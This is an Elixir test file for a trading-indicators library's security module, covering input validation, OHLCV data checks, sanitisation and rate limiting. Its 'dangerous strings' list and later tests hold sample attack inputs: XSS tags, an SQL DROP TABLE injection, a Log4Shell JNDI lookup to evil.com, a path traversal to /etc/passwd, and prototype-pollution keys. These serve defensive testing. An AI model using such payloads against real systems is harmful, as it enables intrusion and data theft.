defmodule TradingIndicators.SecurityTest do
  use ExUnit.Case, async: false

  alias TradingIndicators.Security
  alias TradingIndicators.TestSupport.DataGenerator

  @moduletag :security

  describe "input validation" do
    test "validates list size limits" do
      # Create oversized list
      large_list = 1..200_000 |> Enum.map(&Decimal.new/1)

      assert {:error, message} = Security.validate_input(large_list)
      assert String.contains?(message, "List size exceeds maximum")
    end

    test "validates string content for injection attacks" do
      dangerous_strings = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com}",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
        "../../../etc/passwd",
        "eval('malicious_code')",
        "__proto__.polluted = true"
      ]

      Enum.each(dangerous_strings, fn dangerous_string ->
        assert {:error, _} = Security.validate_input(dangerous_string)
      end)
    end

    test "validates safe strings" do
      safe_strings = [
        "AAPL",
        "Simple trading data",
        "Price: 123.45",
        "Volume: 1000000"
      ]

      Enum.each(safe_strings, fn safe_string ->
        assert :ok = Security.validate_input(safe_string)
      end)
    end

    test "validates number bounds" do
      # Test extreme numbers
      assert {:error, _} = Security.validate_input(1.0e25)
      assert {:error, _} = Security.validate_input(-1.0e25)
      assert {:error, _} = Security.validate_input(:infinity)
      assert {:error, _} = Security.validate_input(:neg_infinity)
      assert {:error, _} = Security.validate_input(:nan)

      # Test safe numbers
      assert :ok = Security.validate_input(123.45)
      assert :ok = Security.validate_input(-123.45)
      assert :ok = Security.validate_input(0)
    end

    test "validates decimal safety" do
      # Test dangerous decimals
      assert {:error, _} = Security.validate_input(Decimal.new("NaN"))
      assert {:error, _} = Security.validate_input(Decimal.new("Infinity"))
      assert {:error, _} = Security.validate_input(Decimal.new("-Infinity"))
      assert {:error, _} = Security.validate_input(Decimal.new("1E25"))

      # Test safe decimals
      assert :ok = Security.validate_input(Decimal.new("123.45"))
      assert :ok = Security.validate_input(Decimal.new("0"))
      assert :ok = Security.validate_input(Decimal.new("-123.45"))
    end

    test "validates map with dangerous keys" do
      dangerous_maps = [
        %{"__proto__" => "polluted"},
        %{__defineGetter__: "dangerous"},
        %{"../../../secret" => "value"},
        %{"eval(" => "dangerous"}
      ]

      Enum.each(dangerous_maps, fn dangerous_map ->
        assert {:error, _} = Security.validate_input(dangerous_map)
      end)
    end

    test "validates memory usage limits" do
      # Create data that exceeds memory limits (simulate large data)
      # Note: This is a simplified test - in practice, you'd need truly large data
      large_string = String.duplicate("a", 1_000_000)
      large_data = List.duplicate(large_string, 100)

      assert {:error, message} = Security.validate_input(large_data)
      assert String.contains?(message, "memory safety")
    end
  end

  describe "parameter validation" do
    test "validates period parameters" do
      # Test invalid periods
      assert {:error, _} = Security.validate_parameters(%{period: 0})
      assert {:error, _} = Security.validate_parameters(%{period: -1})
      assert {:error, _} = Security.validate_parameters(%{period: 10000})
      assert {:error, _} = Security.validate_parameters(%{period: "invalid"})

      # Test valid periods
      assert :ok = Security.validate_parameters(%{period: 14})
      assert :ok = Security.validate_parameters(%{period: 1})
      assert :ok = Security.validate_parameters(%{period: 1000})
      # No period specified
      assert :ok = Security.validate_parameters(%{})
    end

    test "validates multiplier parameters" do
      # Test invalid multipliers
      assert {:error, _} = Security.validate_parameters(%{multiplier: Decimal.new("100")})
      assert {:error, _} = Security.validate_parameters(%{std_dev: Decimal.new("0.01")})
      assert {:error, _} = Security.validate_parameters(%{factor: 50.0})

      # Test valid multipliers
      assert :ok = Security.validate_parameters(%{multiplier: Decimal.new("2.0")})
      assert :ok = Security.validate_parameters(%{std_dev: Decimal.new("1.5")})
      assert :ok = Security.validate_parameters(%{factor: 3.0})
    end

    test "validates reserved parameter keys" do
      dangerous_params = [
        %{__proto__: "value"},
        %{__defineGetter__: "dangerous"},
        %{__defineSetter__: "dangerous"},
        %{__lookupGetter__: "dangerous"}
      ]

      Enum.each(dangerous_params, fn params ->
        assert {:error, message} = Security.validate_parameters(params)
        assert String.contains?(message, "reserved/dangerous keys")
      end)
    end
  end

  describe "OHLCV data validation" do
    test "validates OHLCV data size limits" do
      # Create oversized OHLCV data
      large_ohlcv = DataGenerator.sample_ohlcv_data(100_000)

      assert {:error, message} = Security.validate_ohlcv_security(large_ohlcv)
      assert String.contains?(message, "exceeds maximum size")
    end

    test "validates OHLCV data structure" do
      invalid_ohlcv_data = [
        # Missing required fields
        %{open: Decimal.new("100"), high: Decimal.new("105")},

        # Invalid data types
        %{
          # Should be Decimal
          open: "100",
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: 1000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        },

        # Non-map entry
        "invalid_entry"
      ]

      assert {:error, message} = Security.validate_ohlcv_security(invalid_ohlcv_data)
      assert String.contains?(message, "invalid structure")
    end

    test "validates price values" do
      invalid_price_data = [
        # Negative price
        %{
          open: Decimal.new("-100"),
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: 1000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        },

        # Extreme price
        %{
          open: Decimal.new("10000000"),
          high: Decimal.new("10000005"),
          low: Decimal.new("9999995"),
          close: Decimal.new("10000002"),
          volume: 1000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        }
      ]

      Enum.each(invalid_price_data, fn data ->
        assert {:error, _} = Security.validate_ohlcv_security([data])
      end)
    end

    test "validates OHLC price relationships" do
      invalid_ohlc = [
        # High < Open
        %{
          open: Decimal.new("100"),
          high: Decimal.new("95"),
          low: Decimal.new("90"),
          close: Decimal.new("98"),
          volume: 1000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        },

        # Low > Close
        %{
          open: Decimal.new("100"),
          high: Decimal.new("105"),
          low: Decimal.new("110"),
          close: Decimal.new("102"),
          volume: 1000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        }
      ]

      Enum.each(invalid_ohlc, fn data ->
        assert {:error, message} = Security.validate_ohlcv_security([data])
        assert String.contains?(message, "price must be")
      end)
    end

    test "validates volume values" do
      invalid_volume_data = [
        # Negative volume
        %{
          open: Decimal.new("100"),
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: -1000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        },

        # Extreme volume
        %{
          open: Decimal.new("100"),
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: 10_000_000_000,
          timestamp: ~U[2024-01-01 09:30:00Z]
        }
      ]

      Enum.each(invalid_volume_data, fn data ->
        assert {:error, _} = Security.validate_ohlcv_security([data])
      end)
    end

    test "validates timestamps" do
      now = DateTime.utc_now()

      invalid_timestamp_data = [
        # Too far in future
        %{
          open: Decimal.new("100"),
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: 1000,
          # 2 days in future
          timestamp: DateTime.add(now, 86400 * 2)
        },

        # Too far in past
        %{
          open: Decimal.new("100"),
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: 1000,
          # 2 years in past
          timestamp: DateTime.add(now, -31_536_000 * 2)
        },

        # Invalid timestamp type
        %{
          open: Decimal.new("100"),
          high: Decimal.new("105"),
          low: Decimal.new("95"),
          close: Decimal.new("102"),
          volume: 1000,
          timestamp: "2024-01-01"
        }
      ]

      Enum.each(invalid_timestamp_data, fn data ->
        assert {:error, message} = Security.validate_ohlcv_security([data])
        assert String.contains?(message, "timestamp")
      end)
    end

    test "validates valid OHLCV data" do
      valid_data = DataGenerator.sample_ohlcv_data(10)
      assert :ok = Security.validate_ohlcv_security(valid_data)
    end
  end

  describe "string sanitization" do
    test "sanitizes dangerous strings" do
      dangerous_input = "<script>alert('xss')</script> ${evil} javascript:alert(1)"
      sanitized = Security.sanitize_string(dangerous_input)

      refute String.contains?(sanitized, "<script>")
      refute String.contains?(sanitized, "${")
      refute String.contains?(sanitized, "javascript:")
    end

    test "limits string length" do
      long_string = String.duplicate("a", 1000)
      sanitized = Security.sanitize_string(long_string)

      assert String.length(sanitized) <= 100
    end

    test "preserves safe content" do
      safe_input = "AAPL Price 150.25"
      sanitized = Security.sanitize_string(safe_input)

      assert sanitized == "AAPL Price 150.25"
    end
  end

  describe "rate limiting" do
    test "allows requests within rate limit" do
      identifier = "test_user_#{System.unique_integer()}"

      # First request should pass
      assert :ok = Security.check_rate_limit(identifier)

      # More requests within limit should pass
      for _i <- 1..50 do
        assert :ok = Security.check_rate_limit(identifier)
      end
    end

    test "blocks requests exceeding rate limit" do
      identifier = "heavy_user_#{System.unique_integer()}"

      # Make requests up to limit
      for _i <- 1..100 do
        Security.check_rate_limit(identifier)
      end

      # Next request should be rate limited
      assert {:error, :rate_limited} = Security.check_rate_limit(identifier)
    end

    test "rate limit window resets" do
      identifier = "reset_test_#{System.unique_integer()}"

      # Fill up rate limit
      for _i <- 1..100 do
        Security.check_rate_limit(identifier)
      end

      # Should be rate limited
      assert {:error, :rate_limited} = Security.check_rate_limit(identifier)

      # Simulate time passing (in real test, we'd need to mock time)
      # For this test, we'll just verify the rate limit structure works
      # In production, the window would reset after 60 seconds
    end
  end

  describe "integration with indicators" do
    test "security validation with SMA calculation" do
      # Test with dangerous data
      dangerous_prices = [
        Decimal.new("NaN"),
        Decimal.new("Infinity"),
        Decimal.new("1E25")
      ]

      Enum.each(dangerous_prices, fn price ->
        assert {:error, _} = Security.validate_input(price)
      end)

      # Test with safe data
      safe_prices = DataGenerator.sample_prices(20)

      Enum.each(safe_prices, fn price ->
        assert :ok = Security.validate_input(price)
      end)
    end

    test "security validation with OHLCV indicators" do
      # Test with safe OHLCV data
      safe_ohlcv = DataGenerator.sample_ohlcv_data(20)
      assert :ok = Security.validate_ohlcv_security(safe_ohlcv)

      # Test with dangerous parameters
      dangerous_params = %{
        period: -10,
        __proto__: "dangerous"
      }

      assert {:error, _} = Security.validate_parameters(dangerous_params)

      # Test with safe parameters
      safe_params = %{
        period: 14,
        multiplier: Decimal.new("2.0")
      }

      assert :ok = Security.validate_parameters(safe_params)
    end

    test "comprehensive security check workflow" do
      # Simulate a complete security check workflow
      input_data = DataGenerator.sample_ohlcv_data(50)
      parameters = %{period: 14, std_dev: Decimal.new("2.0")}
      user_id = "test_user"

      # 1. Check rate limiting
      assert :ok = Security.check_rate_limit(user_id)

      # 2. Validate input data
      assert :ok = Security.validate_ohlcv_security(input_data)

      # 3. Validate parameters
      assert :ok = Security.validate_parameters(parameters)

      # 4. Individual data point validation
      Enum.each(input_data, fn bar ->
        assert :ok = Security.validate_input(bar.open)
        assert :ok = Security.validate_input(bar.high)
        assert :ok = Security.validate_input(bar.low)
        assert :ok = Security.validate_input(bar.close)
        assert :ok = Security.validate_input(bar.volume)
      end)
    end
  end

  describe "edge cases and attack vectors" do
    test "handles deeply nested data structures" do
      # Create deeply nested structure to test recursion limits
      nested_data =
        Enum.reduce(1..100, "safe", fn _i, acc ->
          %{"nested" => acc}
        end)

      # Should handle deep nesting gracefully
      result = Security.validate_input(nested_data)
      assert match?(:ok, result) or match?({:error, _}, result)
    end

    test "handles circular references safely" do
      # Test with self-referencing map (should be handled by Elixir's immutability)
      map_data = %{safe: "value", number: 123}
      assert :ok = Security.validate_input(map_data)
    end

    test "validates against prototype pollution" do
      dangerous_data = %{
        "__proto__" => %{"polluted" => true},
        "constructor" => %{"prototype" => %{"polluted" => true}}
      }

      assert {:error, message} = Security.validate_input(dangerous_data)
      assert String.contains?(message, "dangerous")
    end

    test "handles unicode and encoding attacks" do
      unicode_strings = [
        # Unicode mathematical symbols
        "𝕏𝕊𝔖",
        # Control characters
        "\u0000\u0001\u0002",
        # Zero-width characters
        "\u200B\u200C\u200D",
        # Normal unicode
        "café",
        # Emojis
        "🚀📈💰"
      ]

      Enum.each(unicode_strings, fn unicode_str ->
        # Should either pass or fail gracefully
        result = Security.validate_input(unicode_str)
        assert match?(:ok, result) or match?({:error, _}, result)
      end)
    end

    test "memory exhaustion protection" do
      # Test protection against memory exhaustion attacks
      # Note: This is a simplified test - real attacks would be more sophisticated

      # Large list attack (exceed default max_list_size of 100,000)
      large_list = 1..150_000 |> Enum.to_list()
      assert {:error, _} = Security.validate_input(large_list)

      # Large string attack  
      large_string = String.duplicate("A", 10_000)
      assert {:error, _} = Security.validate_input(large_string)
    end
  end
end
